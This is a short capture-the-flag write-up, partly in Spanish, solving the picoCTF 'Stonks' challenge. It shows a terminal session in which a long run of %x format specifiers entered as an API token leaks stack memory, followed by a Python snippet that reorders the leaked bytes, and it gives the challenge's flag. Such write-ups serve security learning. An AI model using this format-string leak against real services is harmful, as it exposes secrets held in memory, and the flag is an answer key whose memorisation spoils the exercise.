## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

## Hints
Okay, maybe I'd believe you if you find my API key.

## Solución

```
th0rtilla-picoctf@webshell:~/bufferOver$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
806a390804b00080489c3f7f6cd80ffffffff18068160f7f7a110f7f6cdc7080691801806a370806a3906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ff98007df7fa7af8f7f7a4408eb51d0010f7e09ce9f7f7b0c0f7f6c5c0f7f6c000ff989698f7dfa68df7f6c5c08048ecaff9896a40f7f8ef09804b000f7f6c000f7f6ce20ff9896d8f7f94d50f7f6d8908eb51d00f7f6c000804b000ff9896d88048c868068160ff9896c4ff9896d88048be9f7f6c3fc0ff98978cff9897841180681608eb51d00ff9896f000f7daffa1f7f6c000f7f6c0000f7daffa11ff989784ff98978cff98971410f7f6c000f7f8f70af7fa70000f7f6c00000f924b69a7df7908a000180486300f7f94d50f7f8f960804b00018048630080486628048b851ff9897848048cd08048d30f7f8f960ff98977cf7fa79401
Portfolio as of Mon May 15 20:24:43 UTC 2023


1 shares of GR
1 shares of T
100 shares of I
391 shares of QPJ
294 shares of C
Goodbye!
^C
th0rtilla-picoctf@webshell:~/bufferOver$ 

En python
>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿ}'
>>> for x in range(0,len(s),4):
...      print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
...
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
IndexError: string index out of range
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6>>>
```
## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}